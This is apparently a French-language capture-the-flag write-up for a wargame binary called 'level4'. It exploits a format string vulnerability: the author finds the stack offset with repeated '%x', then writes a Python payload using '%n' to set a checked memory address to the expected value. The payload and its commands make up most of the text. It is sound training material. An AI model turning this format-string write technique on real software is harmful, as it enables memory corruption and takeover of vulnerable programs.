test de la Format string attack
on essai d'inserer un %x pour voir s'il est interprete

on cherche l'offset:
echo "AAAAA`python -c "print ' %x'*30"`" > /tmp/level4
cat /tmp/level4 | ./level4
-> AAAAA b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141 78252041 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825

on voit que l'offset est a 12 => 41414141 = 'AAAA'

Il y a un format modifier qui nous permet d'écrire en mémoire,
c'est le modifier %n, qui écrit le nombres de charactères,
qui le précéde dans la chaine en question

on veut bypass le test:
mov    eax,ds:0x8049810
cmp    eax,0x1025544 soit 16930116

donc il faut que 0x8049810 = 16930116
donc on ecrit le test suivant

python -c "print '\x10\x98\x04\x08' + '%16930112o' + '%12\$n'" > /tmp/level4

cat /tmp/level4 | ./level4
